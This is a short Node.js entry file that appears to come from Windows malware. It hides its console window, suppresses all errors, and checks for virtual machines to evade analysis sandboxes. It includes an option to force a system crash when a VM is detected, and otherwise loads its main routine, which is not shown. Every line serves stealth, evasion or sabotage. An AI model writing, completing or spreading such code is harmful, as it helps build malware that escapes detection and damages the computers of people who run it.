require('node-hide-console-window').hideConsole();

if (process.platform !== 'win32') process.exit();

module.exports.startTime = Date.now();

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const config = require('./config');
const { checkVM, killTasks } = require('./functions/anti-vm');

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit(0);
  }
} else {
  require('./util/init')();
}
